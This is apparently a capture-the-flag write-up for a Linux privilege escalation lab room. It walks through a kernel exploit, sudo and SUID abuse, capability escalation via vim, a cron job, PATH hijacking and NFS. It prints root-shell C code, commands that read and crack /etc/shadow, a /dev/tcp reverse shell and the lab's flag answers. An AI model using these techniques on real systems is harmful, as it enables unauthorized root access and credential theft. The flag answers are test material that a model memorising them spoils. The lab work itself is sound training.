# Linux Privilege Escalation

> Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.

## Enumeration

```
hostname
uname -a
cat /etc/issue
python --version
```

![image](https://user-images.githubusercontent.com/90561566/195976275-e3fdd29f-8190-4f3b-8d1d-da5fc16514de.png)

![image](https://user-images.githubusercontent.com/90561566/195976293-3a425129-ca5c-4efa-b296-d4960ddf65b1.png)

```
searchsploit linux 3.13.0 Ubuntu 14.04
```

![image](https://user-images.githubusercontent.com/90561566/195976408-23a04384-0a58-480e-94db-a36695adaf17.png)

the answer is `CVE-2015-1328`

![image](https://user-images.githubusercontent.com/90561566/195976412-650b4a78-27d8-485e-81fe-41f56fa8be1a.png)

## Privilege Escalation: Kernel Exploits

download the exploit

```
searchsploit -m 37292.c
```

we can see it can't create or write file on target system, but we can move to /tmp directory to do it

```
cd /tmp
```

transfer the exploit to target system

```
ifconfig
python3 -m http.server
```

![image](https://user-images.githubusercontent.com/90561566/195976643-301ee84d-5619-4cc4-a20d-49551b7cc829.png)

on target system

```
wget 10.18.7.11:8000/37292.c
```

![image](https://user-images.githubusercontent.com/90561566/195976619-7a4c67e1-ca26-4608-8574-bde302dbe47c.png)

run the exploit

```
gcc 37292.c -o abc
id
./abc
id
```

![image](https://user-images.githubusercontent.com/90561566/195976781-2ebebda2-6f78-4f9e-b099-8d3af3f810c6.png)

![image](https://user-images.githubusercontent.com/90561566/195976815-9132a76e-9b9f-49a1-af85-9b8e252bf3f5.png)

| Flag | flag1.txt |
| --- | --- |
| Answer | THM-28392872729920 |

## Privilege Escalation: Sudo

Leverage application functions

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).

![image](https://user-images.githubusercontent.com/90561566/195977500-5a22994c-c0b6-427e-99c2-03ebfc248f1e.png)

Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.

Leverage LD_PRELOAD

On some systems, you may see the LD_PRELOAD environment option.

![image](https://user-images.githubusercontent.com/90561566/195977513-3727c8f3-9c9f-4bd9-a9e6-70145770c0bd.png)


The C code will simply spawn a root shell and can be written as follows;

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
   unsetenv("LD_PRELOAD");
   setgid(0);
   setuid(0);
   system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows

```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This will result in a shell spawn with root privileges.

![image](https://user-images.githubusercontent.com/90561566/195977557-95f47625-a7d2-49ce-a3dd-8baf241bcd88.png)

okay, comeback to this task is about sudo command

```
sudo -l
```

![image](https://user-images.githubusercontent.com/90561566/195977347-8acefc8a-1236-418b-950c-e8e50fbc5d25.png)

flag2 is easy to get with no restriction

![image](https://user-images.githubusercontent.com/90561566/195977474-1bcfcc3b-9df7-4c13-bc21-20295005f224.png)

| Flag | flag2.txt |
| --- | --- |
| Answer | THM-402028394 |

How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

![image](https://user-images.githubusercontent.com/90561566/195977734-88cf1b40-8806-458e-b257-e332f793e710.png)

```
sudo nmap --interactive
```

the next task is see hash of frank's password

and you can use nano, less, find with sudo

![image](https://user-images.githubusercontent.com/90561566/195977934-8fbffaad-c79a-4a1c-bfc8-8ff58ef18e6e.png)

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

or basically with less

```
sudo less /etc/shadow
```

![image](https://user-images.githubusercontent.com/90561566/195978060-52d86ab9-2b27-4a2a-b7b7-41a87d96e4a6.png)

## Privilege Escalation: SUID

You will notice these files have an “s” bit set showing their special permission level.

`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.

![image](https://user-images.githubusercontent.com/90561566/196024494-dc9e397d-f0cc-4960-a52f-df8a45d9a020.png)

We see that the nano text editor has the SUID bit set by running the find / -type f -perm -04000 -ls 2>/dev/null command.

nano /etc/shadow will print the contents of the /etc/shadow file. We can now use the unshadow tool to create a file crackable by John the Ripper.

To achieve this, unshadow needs both the /etc/shadow and /etc/passwd files.

The unshadow tool’s usage can be seen below

```
unshadow passwd.txt shadow.txt > passwords.txt
```

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

![image](https://user-images.githubusercontent.com/90561566/196024905-d9bff419-1e8f-427d-b6bd-58692a44d4db.png)

We will then add this password with a username to the /etc/passwd file.

![image](https://user-images.githubusercontent.com/90561566/196024918-1ec97ebd-d4d8-4249-9f37-4c240cf8fa17.png)

Once our user is added (please note how root:/bin/bash was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.

![image](https://user-images.githubusercontent.com/90561566/196024937-2f8a604d-9998-495c-901b-1066760a6e1e.png)

back to task, we can see base64 is running as suid

![image](https://user-images.githubusercontent.com/90561566/196069204-e200f05f-fad7-40b1-972e-c83560160c2c.png)

```
cat /etc/passwd
```

![image](https://user-images.githubusercontent.com/90561566/196067656-9bbefee7-973f-42e5-82b2-9588523369da.png)

![image](https://user-images.githubusercontent.com/90561566/196067739-d0e41667-2777-45a0-a210-3b599f35c9ff.png)

What is the password of user2?

First we will need to find the password hashes for our passwd.txt file. Run `base64 /etc/passwd | base64 --decode | tail -n4` in your terminal and copy the last bit into your `passwd.txt` file.

Next we will need to find the password hashes for our shadow.txt file. Run `base64 /etc/shadow | base64 --decode | tail -n4` in your terminal and copy the last bit into your `shadow.txt` file.

![image](https://user-images.githubusercontent.com/90561566/196068265-ed681f4c-d2a8-44d7-923e-4217db35f654.png)

Next, we need to unshadow our passwords

```
unshadow passwd.txt shadow.txt > passwords.txt
```

Finally we can use the John The Ripper tool to crack the password

```
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

![image](https://user-images.githubusercontent.com/90561566/196068630-0227b7d3-bc22-47b9-9da2-84db2dcbeac1.png)

We can use the same trick to see flag3

```
base64 /home/ubuntu/flag3.txt | base64 --decode
```

![image](https://user-images.githubusercontent.com/90561566/196069314-cc38d458-3441-43b5-ba99-c5d0abda009b.png)

| Flag | flag3.txt |
| --- | --- |
| Answer | THM-3847834 |

## Privilege Escalation: Capabilities

list enabled capabilities

```
getcap -r / 2>/dev/null
```

We can see 6 binaries and other binary is view can be used through its capabilities

![image](https://user-images.githubusercontent.com/90561566/196361386-89227b71-c8d6-4a16-891a-5b797ff29d7b.png)

and we can use vim by its capability

```
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

![image](https://user-images.githubusercontent.com/90561566/196364019-516fe900-bf8d-46ec-901c-198ff773ca30.png)

| Flag | flag4.txt |
| --- | --- |
| Answer | THM-9349843 |

## Privilege Escalation: Cron Jobs

```
cat /etc/crontab
```

there are 4 cron jobs

![image](https://user-images.githubusercontent.com/90561566/196370245-324b8d39-c32b-488e-9d41-f294d7ea1fd0.png)

i can see a file backup.sh

![image](https://user-images.githubusercontent.com/90561566/196370535-067416ec-cb43-40c1-bdcf-00471abc6069.png)

change the file content to `bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`

![image](https://user-images.githubusercontent.com/90561566/196371436-d99633d1-b1f6-419b-97c9-6a08618fbf5d.png)

run a listener by netcat

```
nc -vlnp 4444
```

I forgot to check if the script file was set to executable or not, and I kept waiting for the reverse shell and it never connected back

I wasted hours googling, modifying my bash shell, trying to figure out why my cron job script isn’t working. I was about to give up until I noticed the permissions…

```
chmod +x backup.sh
```

ok now we got the reverse shell with root privileges

![image](https://user-images.githubusercontent.com/90561566/196392720-b76682ef-ab69-4b50-91c4-b4380fec41a6.png)

| Flag | flag5.txt |
| --- | --- |
| Answer | THM-383000283 |

use the same trick to crack password of matt: `123456`

## Privilege Escalation: PATH

search find wrireable folders under home

```
find / -writable 2>/dev/null | grep home
```

![image](https://user-images.githubusercontent.com/90561566/196634144-ac36ab44-53be-4000-9bcb-d96987e0296a.png)

we can see 3 folders in home

![image](https://user-images.githubusercontent.com/90561566/196634310-1ae050bf-2336-42e7-bc22-f4b37dc26832.png)

i found flag6 is under folder matt, but let see what on folder murdoch

![image](https://user-images.githubusercontent.com/90561566/196635808-328abd0e-d934-4113-817c-76c2a8b3ff90.png)

we see that it is dependent on thm, so that means we will need to create a thm file and write a little script to read the contents of flag6.txt

```
echo "cat /home/matt/flag6.txt" > thm
chmod +x thm
export PATH=/home/murdoch:$PATH
```

now enable the script

```
./test
```

![image](https://user-images.githubusercontent.com/90561566/196639273-a7ee57d0-de13-4314-8da5-d4f7d82832f3.png)

| Flag | flag6.txt |
| --- | --- |
| Answer | THM-736628929 |

## Privilege Escalation: NFS

enumerate mountable shares from our attack machine

```
showmount -e 10.10.226.120
```

![image](https://user-images.githubusercontent.com/90561566/197327648-7b613574-16c9-4da8-b532-7d17be695b8b.png)

```
cat /etc/exports
```

![image](https://user-images.githubusercontent.com/90561566/197327716-28a1c444-8766-462c-8491-0f087a65abb3.png)

create a folder to work on our machine

```
mkdir /tmp/THM
cd /tmp/THM
```

![image](https://user-images.githubusercontent.com/90561566/197328594-b0864c09-b4b7-478e-84a1-7c9b0d07e0e4.png)

i will mount with /tmp shared folder

```
sudo mount -o rw 10.10.226.120:/home/ubuntu/sharedfolder /tmp/THM
```

![image](https://user-images.githubusercontent.com/90561566/197328667-407c2e21-1060-4942-b4e5-e630ddb56894.png)

now we can see the files are present on both the machines here

![image](https://user-images.githubusercontent.com/90561566/197328684-c0315e23-c37b-4ad9-a6a0-8f23aabdfaec.png)

```
vi nfs.c
```

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}
```

```
gcc nfs.c -o nfs -w
chmod +s nfs
ls -l
```

![image](https://user-images.githubusercontent.com/90561566/197328715-c30d9085-43dc-4ce5-901c-80eca5326e34.png)

You have now root access and can run

```
./nfs
```

![image](https://user-images.githubusercontent.com/90561566/197328729-c802b7d1-c304-4169-83c9-f653b03ad10e.png)

You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).

```
cat /home/matt/flag7.txt
```

| Flag | flag7.txt |
| --- | --- |
| Answer | THM-89384012 |

## Capstone Challenge

Look an overview, there is an empty folder

![image](https://user-images.githubusercontent.com/90561566/197378519-719f4189-011a-4c7f-9688-d160bfc1f887.png)

enumeration

```
find / -type f -perm -04000 -ls 2>/dev/null
```

i see base64 can use with SUID

![image](https://user-images.githubusercontent.com/90561566/197378776-c317b84d-4108-41c3-86e0-9d7c8e7102d5.png)

now we will use base64 to unshadow /shadow and /passwd data

```
base64 /etc/shadow | base64 -d
base64 /etc/passwd | base64 -d
```

and copy the password hash to 2 files

![image](https://user-images.githubusercontent.com/90561566/197379167-9c608ae2-d30f-48fb-9165-958c0b441ee6.png)

now crack the password

```
sudo unshadow passwd.txt shadow.txt > cracked.txt
john --wordlist=/usr/share/wordlists/rockyou.txt cracked.txt
john --show cracked.txt
```

![image](https://user-images.githubusercontent.com/90561566/197379355-9b635ea7-d3fa-4d7f-9328-984075906b79.png)

switch to `missy` with `Password1`

![image](https://user-images.githubusercontent.com/90561566/197379459-86579921-8490-424b-a9b7-2e9a3d1d61ed.png)

```
sudo -l -l
```

![image](https://user-images.githubusercontent.com/90561566/197379515-52def7d5-559d-415a-be52-c24578946f57.png)

now we can find our 2 flags location with sudoer

```
sudo find / -name *flag*.txt
```

![image](https://user-images.githubusercontent.com/90561566/197379587-a1263d5d-6ce1-4d81-a8d6-2ada79dde928.png)

cat the flag1

![image](https://user-images.githubusercontent.com/90561566/197379600-d960542d-15cc-4371-abe3-fe65c65bf5f0.png)

| Flag | flag1.txt |
| --- | --- |
| Answer | THM-42828719920544 |

now we need root access to see rootflag

![image](https://user-images.githubusercontent.com/90561566/197379688-916ce77a-ec60-4e15-8ead-bdfae2c50316.png)

that is very easy with

![image](https://user-images.githubusercontent.com/90561566/197379748-ff94d0ac-b0cf-4ce0-b872-1f2d62780ad5.png)

```
sudo find . -exec /bin/sh \; -quit
```

![image](https://user-images.githubusercontent.com/90561566/197379789-5441610c-3701-48f7-8767-c453499f0b0a.png)

| Flag | flag2.txt |
| --- | --- |
| Answer | THM-168824782390238 |








